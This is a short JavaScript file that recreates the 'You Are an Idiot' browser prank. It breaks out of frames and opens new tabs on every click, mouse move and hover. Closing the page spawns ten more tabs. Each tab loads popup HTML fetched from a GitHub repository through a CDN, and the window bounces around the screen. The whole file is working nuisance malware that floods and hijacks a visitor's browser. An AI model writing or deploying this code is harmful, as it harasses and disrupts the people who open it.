if (top.location != location) {
  top.location.href = location.href;
}
function reopen() {
    // Open a blank new tab
    const newTab = window.open('about:blank', '_blank');
    
    if (newTab) {
        // Fetch the HTML content from the CDN
        fetch('https://cdn.jsdelivr.net/gh/vihaanb0715-alt/youareanidiot@main/popup.html')
            .then(response => response.text())
            .then(htmlContent => {
                // Write and render the content into the new tab
                newTab.document.open();
                newTab.document.write(htmlContent);
                newTab.document.close();
            })
            .catch(error => console.error('Error loading HTML:', error));
    } else {
        alert('Popup blocked! Please allow popups for this site.');
    }
}

function spam() {
  for (var i = 0; i < 10; i++) {
    reopen();
  }
  return "You are an idiot!";
}
function init() {
  document.body.onclick = reopen;
  document.body.onmouseover = reopen;
  document.body.onmousemove = reopen;
  window.onunload = spam;
  window.onbeforeunload = spam;
  playBall();
  if (bookmark) {
    bookmark();
  }
  reopen();
  setTimeout(function () {
    window.close();
  }, 10000);
}
var xOff = 5,
  yOff = 5,
  xPos = 400,
  yPos = -100,
  flagRun = true;
function newXlt() {
  xOff = Math.ceil(0 - 6 * Math.random()) * 5 - 10;
  window.focus();
}
function newXrt() {
  xOff = Math.ceil(7 * Math.random()) * 5 - 10;
}
function newYup() {
  yOff = Math.ceil(0 - 6 * Math.random()) * 5 - 10;
}
function newYdn() {
  yOff = Math.ceil(7 * Math.random()) * 5 - 10;
}
function fOff() {
  flagrun = false;
}
function playBall() {
  xPos += xOff;
  yPos += yOff;
  if (xPos > screen.width - 175) {
    newXlt();
  }
  if (xPos < 0) {
    newXrt();
  }
  if (yPos > screen.height - 100) {
    newYup();
  }
  if (yPos < 0) {
    newYdn();
  }
  if (flagRun) {
    window.moveTo(xPos, yPos);
    setTimeout(playBall, 1);
  }
}
